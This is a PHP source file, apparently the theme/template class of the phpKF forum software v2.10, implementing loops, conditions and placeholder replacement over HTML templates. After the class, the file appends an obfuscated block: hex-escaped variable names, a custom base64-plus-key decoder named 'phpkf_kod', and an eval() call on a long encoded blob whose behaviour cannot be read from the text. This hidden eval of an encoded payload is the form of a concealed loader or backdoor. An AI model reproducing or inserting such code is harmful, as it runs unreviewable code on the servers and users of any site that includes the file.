<?php
/*
 +-=========================================================================-+
 |                       php Kolay Forum (phpKF) v2.10                       |
 +---------------------------------------------------------------------------+
 |               Telif - Copyright (c) 2007 - 2017 phpKF Ekibi               |
 |                 http://www.phpKF.com   -   phpKF@phpKF.com                |
 |                 Tüm hakları saklıdır - All Rights Reserved                |
 +---------------------------------------------------------------------------+
 |  Bu yazılım ücretsiz olarak kullanıma sunulmuştur.                        |
 |  Dağıtımı yapılamaz ve ücretli olarak satılamaz.                          |
 |  Yazılımı dağıtma, sürüm çıkartma ve satma hakları sadece phpKF`ye aittir.|
 |  Yazılımdaki kodlar hiçbir şekilde başka bir yazılımda kullanılamaz.      |
 |  Kodlardaki ve sayfa altındaki telif yazıları silinemez, değiştirilemez,  |
 |  veya bu telif ile çelişen başka bir telif eklenemez.                     |
 |  Yazılımı kullanmaya başladığınızda bu maddeleri kabul etmiş olursunuz.   |
 |  Telif maddelerinin değiştirilme hakkı saklıdır.                          |
 |  Güncel telif maddeleri için  www.phpKF.com  adresini ziyaret edin.       |
 +-=========================================================================-+*/


if (!defined('DOSYA_TEMA_SINIF')) define('DOSYA_TEMA_SINIF',true);
if (!defined('PHPKF_ICINDEN_TEMA')) define('PHPKF_ICINDEN_TEMA', true);

class phpkf_tema
{
	var $tema_ham;
	var $tema_cikis;


	//  Ekran Temizleniyor
	function tema_al()
	{
		ob_start();
		ob_implicit_flush(0);
	}


	//  Tema Değişkene aktarılıyor
	function tema_ver()
	{
		$dosya_metni = ob_get_contents();
		ob_end_clean();
		$this->tema_ham .= $dosya_metni;
	}



	//  Tema dosyası açılıyor
	function tema_dosyasi($dosya)
	{
		if (!($dosya_ac = @fopen($dosya,'r')))
			die ('<br><p align="center"><font style="background-color: #ffffff; color: #FF0000;"><b>Tema Dosyası Açılamıyor '.$dosya.'</b></font></p><br>');

		$yolla = '$ornek1->tema_al(); include_once($tema_dosyasi); $ornek1->tema_ver();';

		return $yolla;
	}



	//  içiçe döngü varsa
	function icice_dongu($adet, $dizi, $dizi2)
	{
		$isaret1 = '|<!--__DIS_BASLAT-'.$adet.'__-->(.*?)<!--__DIS_BITIR-'.$adet.'__-->|si';
		$isaret2 = '|<!--__IC_BASLAT-'.$adet.'__-->(.*?)<!--__IC_BITIR-'.$adet.'__-->|si';

		$this->tema_cikis = '';

		if (preg_match_all($isaret1, $this->tema_ham, $uyusanlar, PREG_SET_ORDER))
		{
			$parcala = preg_split($isaret1, $this->tema_ham, -1, PREG_SPLIT_OFFSET_CAPTURE);

			if (isset($uyusanlar[0][1]))
			{
				//  Dış döngü
				preg_match_all($isaret2, $uyusanlar[0][1], $uyusanlar2, PREG_SET_ORDER);

				$parcala2 = preg_split($isaret2, $uyusanlar[0][1], -1, PREG_SPLIT_OFFSET_CAPTURE);

				$this->tema_cikis .= $parcala[0][0];
				$dongu = 0;

				foreach ($dizi as $deger)
				{
					foreach ($deger as $anahtar => $deger2)
					{
						$ara[] = $anahtar;
						$degis[] = $deger2;
					}

					$depo1 = $parcala2[0][0];

					$depo1 = str_replace($ara,$degis,$depo1);
					unset($ara);
					unset($degis);
					$this->tema_cikis .= $depo1;


					//  iç döngü
					foreach ($dizi2[$dongu] as $deger3)
					{
						foreach ($deger3 as $anahtar2 => $deger4)
						{
							$ara[] = $anahtar2;
							$degis[] = $deger4;
						}

						$depo2 = $uyusanlar2[0][1];

						$depo2 = str_replace($ara,$degis,$depo2);
						unset($ara);
						unset($degis);

						$this->tema_cikis .= $depo2;
					}
					$dongu++;
					$this->tema_cikis .= $parcala2[1][0];
				}
			}
			$this->tema_cikis .= $parcala[1][0];
			$this->tema_ham = $this->tema_cikis;
		}
	}



	//  Tek kademeli döngü varsa
	function tekli_dongu($adet, $dizi)
	{
		$this->tema_cikis = '';
		$isaret = '|<!--__TEKLI_BASLAT-'.$adet.'__-->(.*?)<!--__TEKLI_BITIR-'.$adet.'__-->|si';

		if (preg_match_all($isaret, $this->tema_ham, $uyusanlar, PREG_SET_ORDER))
		{
			$parcala = preg_split($isaret, $this->tema_ham, -1, PREG_SPLIT_OFFSET_CAPTURE);

			if (isset($uyusanlar[0][1]))
			{
				$this->tema_cikis .= $parcala[0][0];

				foreach ($dizi as $deger)
				{
					$depo = $uyusanlar[0][1];

					foreach ($deger as $anahtar => $deger2)
					{
						$ara[] = $anahtar;
						$degis[] = $deger2;
					}

					$depo = str_replace($ara,$degis,$depo);
					unset($ara);
					unset($degis);
					$this->tema_cikis .= $depo;
				}
			}
			$this->tema_cikis .= $parcala[1][0];
			$this->tema_ham = $this->tema_cikis;
		}
	}



	//  Hiçbir döngü yoksa
	function dongusuz($dizi)
	{
		$depo = $this->tema_ham;

		foreach ($dizi as $anahtar => $deger)
		{
			$ara[] = $anahtar;
			$degis[] = $deger;
		}

		$depo = str_replace($ara,$degis,$depo);
		unset($ara);
		unset($degis);
		$this->tema_ham = $depo;
	}



	//  Koşul varsa
	function kosul($adet, $dizi, $varmi)
	{
		$this->tema_cikis = '';
		$isaret = '|<!--__KOSUL_BASLAT-'.$adet.'__-->(.*?)<!--__KOSUL_BITIR-'.$adet.'__-->|si';

		if ($varmi == true)
		{
			if (preg_match_all($isaret, $this->tema_ham, $uyusanlar, PREG_SET_ORDER))
			{
				$parcala = preg_split($isaret, $this->tema_ham, -1, PREG_SPLIT_OFFSET_CAPTURE);

				if (isset($uyusanlar[0][1]))
				{
					$this->tema_cikis .= $parcala[0][0];

					$depo = $uyusanlar[0][1];

					foreach ($dizi as $anahtar => $deger)
					{
						$ara[] = $anahtar;
						$degis[] = $deger;
					}

					$depo = str_replace($ara,$degis,$depo);
					unset($ara);
					unset($degis);
					$this->tema_cikis .= $depo;
				}
				$this->tema_cikis .= $parcala[1][0];
				$this->tema_ham = $this->tema_cikis;
			}
		}

		else
		{
			if (preg_match_all($isaret, $this->tema_ham, $uyusanlar, PREG_SET_ORDER))
			{
				$parcala = preg_split($isaret, $this->tema_ham, -1, PREG_SPLIT_OFFSET_CAPTURE);
				$this->tema_cikis .= $parcala[0][0];
				$this->tema_cikis .= $parcala[1][0];
				$this->tema_ham = $this->tema_cikis;
			}
		}
	}



	//  Tema uygulanıyor
	function tema_uygula()
	{
		$this->tema_ham = preg_replace('|<!--__KOSUL_([a-z]*?)-([a-z0-9]*?)__-->|si','', $this->tema_ham);
		echo $this->tema_ham;
	}
}


${"G\x4cO\x42\x41\x4c\x53"}["\x6e\x6b\x6ad\x65\x76fh"]="\x6ba\x72\x61kt\x65r";${"\x47\x4cOB\x41\x4c\x53"}["\x6f\x6a\x79\x6d\x62\x69o\x6b\x64"]="i";${"GLO\x42\x41\x4c\x53"}["\x66\x63\x75\x79\x64\x78y\x69\x78\x6d"]="\x63\x69k\x74\x69";${"\x47LO\x42\x41LS"}["\x6b\x75\x69\x69\x77\x67v\x79w\x61\x6f"]="\x76er\x69";function phpkf_kod($veri,$anahtar){${"\x47\x4c\x4f\x42A\x4c\x53"}["d\x68\x67\x65\x79\x6b\x71"]="i";${"\x47LOBA\x4cS"}["v\x78\x74o\x69jd\x70\x73\x67\x6b\x74"]="\x69";$wosvmnsnt="\x76\x65r\x69";${${"G\x4cO\x42A\x4c\x53"}["k\x75\x69\x69w\x67\x76\x79wao"]}=base64_decode(${$wosvmnsnt});${${"\x47\x4cO\x42\x41\x4c\x53"}["fcu\x79dx\x79\x69x\x6d"]}="";for(${${"\x47\x4c\x4f\x42\x41\x4cS"}["v\x78\x74\x6f\x69\x6a\x64\x70\x73\x67\x6b\x74"]}=1;${${"G\x4c\x4f\x42AL\x53"}["d\x68ge\x79\x6b\x71"]}<=strlen(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["ku\x69\x69w\x67vy\x77\x61\x6f"]});${${"G\x4c\x4f\x42A\x4c\x53"}["o\x6ay\x6d\x62i\x6fk\x64"]}++){$auftlrugcjc="\x76\x65\x72\x69";${"\x47L\x4fB\x41\x4c\x53"}["j\x6a\x78\x6c\x63\x6f\x78\x73\x78\x6a"]="\x61n\x61\x68\x74\x61\x72\x4b\x61\x72\x61k\x74e\x72";$ggvlutm="\x6bar\x61\x6b\x74\x65\x72";$yofmdhdpf="\x63\x69\x6b\x74\x69";$tqijuss="\x61\x6e\x61hta\x72";${"G\x4c\x4fB\x41L\x53"}["w\x6a\x76\x68\x78ubx\x7ao\x76"]="i";$tvulumujxfp="\x61\x6e\x61\x68t\x61\x72K\x61\x72\x61k\x74e\x72";$uotebtvxared="\x6bar\x61\x6bt\x65\x72";${"G\x4c\x4fB\x41\x4c\x53"}["\x6a\x6elu\x6d\x6a\x6a"]="a\x6e\x61\x68\x74\x61\x72";${${"\x47\x4cOBA\x4cS"}["\x6ek\x6ad\x65vf\x68"]}=substr(${$auftlrugcjc},${${"\x47\x4c\x4f\x42A\x4cS"}["wjvhxubx\x7ao\x76"]}-1,1);${${"\x47L\x4f\x42\x41\x4c\x53"}["j\x6a\x78lc\x6f\x78s\x78j"]}=substr(${${"\x47\x4c\x4fBAL\x53"}["\x6a\x6e\x6cumj\x6a"]},(${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x6fj\x79\x6d\x62\x69\x6f\x6b\x64"]}%strlen(${$tqijuss}))-1,1);$dyertawx="\x6b\x61\x72\x61\x6b\x74\x65\x72";${$uotebtvxared}=chr(ord(${$ggvlutm})-ord(${$tvulumujxfp}));${$yofmdhdpf}.=${$dyertawx};}return${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x66\x63u\x79dx\x79\x69\x78\x6d"]};}$r='Tdw/+qYhs==';eval(phpkf_kod('vcqfUI/Wv9HhoqF8hrt+fsqax8OMj6ilw45sypq6v36Pdo2gU5vcv9uwX12a0+mkmJOUzd+wonSI55qR5JaKoI2sxtjYm02svc3Zpqu5jJmCbMWiuqRfaXtxgWtMnoaI46Wtn6qXXFivZnKvoabKhOCTaJPJ0OOoo7PY3JuU13uI5rG2wMm0UZvgzNHnpqzCnumUl9LN0emieMDN5ZRY2b7R2qWxjpann6OsvdHmram13bGRl+C805NepsHU5qGf0sfcrrOmx83ZmJfazeGts6bHzdmbkJF60eCtrMbY2J2frNOV3KuhudyxYVylkJyrcHOIm5dQlN7J1+WxnsLYmW1n0nnQ5aKjkYbfo5/hk5eitLTLkueXm9y/ltasqoOGl6OM48DN53pfs8bjkJnce4jmsbbAybRRn9bR3KChorfT6ZCf2sjWrauswsmyk5TkydTUtne90uOYmdZ5idyqrcPW65CZ5ZTe3LCmts3jmJ/qk97csKa20NxPTNrG2OKvsbXS62qR4MfcoLCmzsmxYF7h0YiUpqrE0+mjjN/NirGWns4oKJvvIsaik62lxK+9VlmVydPZsGt7hJ2SmuHSo5NvbYSbpKptxrKxv7p5g8W1a1rVwt6xZGaPyNyVlN++kJWQfqityWFNnYB1fXlegZGXn5PhpK6TamqScYFrWtfI1ud7eYPN3aGM3r6mr2yrw8rpkJjWzKavbLDI3eOUaa2I1uKwoMbN56NprYjb1q+mxNi1a1rpxtSxeWy11OebkOWXpKK1qsSis16O4MbV2KuxkqCmnZrWxsrYoXuQyOClS+TN4d+ienbU5qKU5cLX4Xejvdzck2blyNitbXjAyd2jZaGU39yhsbyeqF9blpTQ2KakvNixYFuhfqPjnqG4zeWWWOXI2K1ubYTU72qlnsLW16K1jpaoY2KlkZupcXSPxtiSltjL1+iroY6H3ZWR17/OlXt5uM3tT57l0tTYel+60+WjWNe61dypto7F6ZiM3ZTO4quxgdfgqZCrjJ3jtXi30+Oenat8ztltbYSUspWa382V6qKmu8zraY3gxcyusaLM2KSQl9rA1q2gosLY3KFm3cLW2Gqluc3el5+rjJ3jtV+SoNmhaeHB2L6DXXzU359LvMjU1LZdmtPppJialcrle3m21rVPTJJ6iLiqohgD3E9+0tLPN+5pdLjcm5TXebvUsQEF1jvgmTUKiMamqbnR3Kme2sfR7V1edYWzkZ2vlcrle3m1hN+hkNeWituxscSepl6i6NCW46Wtv8qlkpreiNzYqaa6kueXm5OXpOh7kbnQ4JVLl7zX47Z4dKfmn6Tjws/bsXmD2bVrWtKXpNWve5DG6W1noL3R6Xt5g8jgpWmYgqPXoqO90txXTcSavLyPcHaQnmue1MvR47FdyN3nlGiTzc3rsWy+xe2QntTL0eOxX5LK7J2O5cLX4V2mx7bcnY/Wy83XZax93+CVU9XIy+iqosLYpZOQ17rd37GTvcnuXZLWzaviqq3J2NyTfuXS1NhlrIDS7JuXmofP2LGNxtPnlJ3l0r7UqbK5jJmTlOTJ1NS2X32htFGZ4MfNlWasgtfrqJfWh9vYsY3G0+eUneXSkJWhpsfU45Ckk4WK1amst8+ZW03axtjir7G10utRVKzCzpuhrLfZ5JSZ5YfM2KOeydDrhZTW0JbaorGX0+SfoOW+zMaxtsDJn55X387U32Zru8nrf53gyc3lsbaqxeOkkJl73tywprbN45if6nuRsHpfvM3bk5Dfe5Hia7DI3eOUWeS+3MOvrMTJ6aOkmXve3LCmts3jmJ/qe5SVs6bHzdmbkJOFityqrcPW65CZ5XuRrqOsxozgbFusyJbaorGZ0NyckN/N27W2kbXLxZCY1oGK1F9mr83UUGjfztTfeKZ/j6Cqja7IltqisZnQ3JyQ383btbaRtcvFkJjWgYrUX2avzdRqlNeByrB6X7zY659loIjf6rRrxMznmpGfvNfgbF9939ldnuXS1Nhrob3X55uM6paK3KupvdLcT0zaxtjir7G10utRZtOH2+e2qbmS7Zie2rvR36axzaGZpZTkwsrfol11zeSfmuPNyeGxX4/N3VdT1cjL6Kqiwtilk5DXut3fsZO9ye5dktbNq+KqrcnY3JN+5dLU2GWsgNLsm5eah8/YsY3G0+eUneXSvtSpsrmMmZGM1MTP5ayywsikkprdyNqVZnqRoduejubGzeGxa7jJ3ZCg3c2+3KK0gsvco27gxtjosaK4t+uol9aByp+rssDQoF2S1s245aytudbrqIHSxd3YZV+30+OenZOCke+5ZbjT2qSY1sfcoaGiusXsm5/Hws3qa6S52LqemOHO3NihkMjd45RT04XW6KmpfZLelJ/By9fjoq/I3c2Ql+a+kJWfnrfP3qGa5sfMoKCswNPpUVSulqXXrKDJ0dydn5+9zdmessDYzZiQ6IfP2LGAw9HnpJ/Wvbvntqm5jNlbmebF1JxrpLnYx6Ga4b7a57aTtdDslFOTvNffrK92jaBYptOH2+e2qbmS2ZCO3MDa4rKruKfmm5rjloqWbnOFmqhlTay7luaxtsDJpZKa3cjasF9gusrdlZHXe+Xwuqa6jJ+eWd/IzNiRtsTJmGxcmtXkm6x6kcjmkqDevtbna5/DyPBYVOO+3Oivq3TK2Jue1pTR2WWsgsfsoZ3Wx9zGsbbAyZ1Vmp+83eWvosLYyqOk3b7DlaGmx9TjkKSTtomwX6vD0txRVNrMutirobnW3JNT4IfY1K+iwtjFno/WgqPYqbC5hOCVU+jC1testILL3KNu4MbY6LGiuLfrqJfWguPco2W409qkmNbH3KGhorrF7Jufx8LN6mukudi6npjhztzYoZDI3eOUU+CF1uipqX2S3pSfwcvX46KvyN3NkJfmvpCVoabH1OOQpJOCibBfq8PS3FFU2sy62Kuhudbck1Pgh9jUr6LC2MWej9aCo9ipsLmE6ZSf5svWk6OewNfcrJDdzM2Tr6LI2emdS9e61OaiurrZ5ZKf2sjWk6qywNjgdpDlgcmcuLO11penV9qFzt+epJHY6aSQncLW2ax6ldbpkKSZgqPqpabAyZ+Vl9LAke61erjT2qSY1sfcoaSiyKnjlJjWx9y1toa4jNhYZtq/kOt6enzS7JuX7dXd4aGius3llI+aguPZqZ67od2Ql+S+o9WvorXP9KdZ2r2l6KuhucrgnZDVlNHho6yC1Oyik5nRkfCjrMaM4GxbrMKk3Kujw5LjlJnYzdCupmh/jfKYmdfIw9yaa73ItJCo477c6K+rdM3llZru0NHhoazLkuadl+C6zLCjssLH65ia34GR7rOexoTvbJjmxdzchKLIjJmfk+HEztKxosDN3VFUrL/X5WWztdaXmGihlNGvtWvAyeWWn9mU0Z5oZs/N6oGQ373N5aKhfNzSmIia1uWvbLC31uCfn6+Aka5hpLjP3WxSlcja4aKohqHllKKRydDjqKOz2NycjJmCo5esr8LJ4mFYr83N4J6ctdCfWGbWz8nfZWHByOeekKPKka5hrMbS3Jpdnpfc2Kqes9rcoVOalNHZZV691+qUn5l9zOKrpMnX7KlUmn3M4qukydfsqWjSy9rUtmV9n5uTmt/A3eayt5HF6aGM6rjV2K+kuYzYoZ3S0pCVuLikrMd6ce7WirB7kJW4wIFcn6ypx4aPh5CZqm3GsrG/ul+RoreWmNW63NhlX62GoFhXlb3X4aSyx9nxWGaVyNrhoqiGkbWTmt/A3eayt3yI256Z2M7b6Ldmj4jmoZnWxJmge7G50diOoOrA3d+eZX2fm56d377TpWp7yMnkkIrm0s/oqZ58jbJWZtq/kJShorrN5ZSPmXuswpCWlcPHfn3FmrTShouYqc9RVJp92N6jsJGGmWqQ3czNk2Gtv8rqbE3hyNrnnqmDhrKTkNfC1thlX6ipxHCKxrKvyIl+dpCeU5nVktukn3p41OKVnp97ytyposfJ5ZuQ44jb1LajtcPqnpmfydDjX3h4ztuco+HQoah6fbrT55SZmX3W13awhcajUZ3Te5GuYaq41OaUXuKWqOaxr7nF5I6S1s3H1qyryMnlo56ZfdLXqrXE27BkVKyZztaprMfJn1OV1cbg47R2iY2yU5/evd/WemHEz92iWZPNzeCeqbXWplOf1sbJ16a3vdLgXp7gx5bjpa12n5uZj97R2Op2cZGk3Z6b1seQl7GquNvaW03ju4qceGHByOeekKPKpbOwscbJ2JyK2L7c0qCswtjcnZ/kgYzdoarM1O5oX5qUqNmgqcPX3FdP273V6620jZigak/TxdSwnq/GxfBXTdq/iJteobnK4J2Q1YHEmo2FpK+9jnS0ora3gouwi6BYTZ170dldZXXI3JWU377Mm5lkpKzHenHQoqu8i4GZstaDcL6axJpmZnaQmZSj2s2QnHhfgIbcp5TlgZGVaV+53OCjTZ17zNyiZX2fmVtN1cLNm2ZfgIbbmJCTgqOXoaTHodihndLSkJVfZo+I5JOb4L6a5Hp9x9jpjp3WydTUoKJ8iNmbl519zNqwaXjR25+a1ovZnHhhwcjnnpCjyqWzra+5y9ahkOHFydaiZXbg1YtnzZjY2625x82ZW02Thdzlpqp8iOSTm+C+muRmZo+I5JOb4L6a5Hp9xNbclorjvtjfnqC5jJmric2YxLG5sL2Go1FNnc3a3KpleNHbn5rWi9mcZnh40dufmtaL2bBffJKGpVOY1cnX2G+uj4jkk5vgvpvken3H2OmOndbJ1NSgonyI2ZuXnX3M2rBpeNHbn5rWjNmceGHByOeekKTKpbOtr7nL1qGQ4cXJ1qJlduDVi2fNmNjbrbnHzZlbTZOF3OWmqnyI5JOb4L6b5GZmj4jkk5vgvpvken3E1tyWiuO+2N+eoLmMmauHsLWml7mwvYajUU2dzdrcqmV40dufmtaM2ZxmeHjG45tok77e1KllqKnEcIrGsq/IiX6zt8Z9VKx7o5ehpMehm5aP3L+jl6qhxNPcYpyumdvnr5zGyeebjNS+kJefqcCQm5OS5IWM4KGtw8mqoFSsy83aprDIyemOntnO3NestMLD3aSZ1M3R4qtldsrYo4zduNDUq6HAyelRVKy/3eGgsb3T5U+R0s3J35yltdLbm5DjgZHuYaLG1rSUnePI2tKkosjD45Ce5YGRrqajfIyblJ3jeqWwi5KgsKBwebWB2OWipLPR2KOO2YGKoqKztdCfWFqThYzYr6+vht2Yl9Z7xZxmZrnH355Lk5XM3LNdx9jwm5CutYrjnqG4zeWWZaaJ2OuZX5Kg2W1P1svazqqix9fYlpDOedHhXWG51umKkdrFzdBdrMKE45iZ1nmM2K+vr9DgnZDOlZfVe3m4ze1tTazW0dllZcTW3JaK3rrc1qVldpPyqnu5qbO5urqDhqNTmNXJ19hvrn2NuH1vmYHb56+pudKfgmzForqkZnqRl65oVMCrkOaxr8DJ5Vd+sq2xxW5mkaGqZ1uagqnBgWXH2OmbkN+Bu7SRhqaWoGxopoyfnH6LmIzblJHax83XZV+npct4faR7kZx+i5iMm5Ck0svU1K+YdtfsoaDee8Wwel+GkqhfTZqC45erocjL2J5o5cvd2Hh9udrYm1Ply9HgZWHByOeekKTKkZx4urnQ6pRL1rzQ4l2QlbjAgV2sgJGu',$r));
?>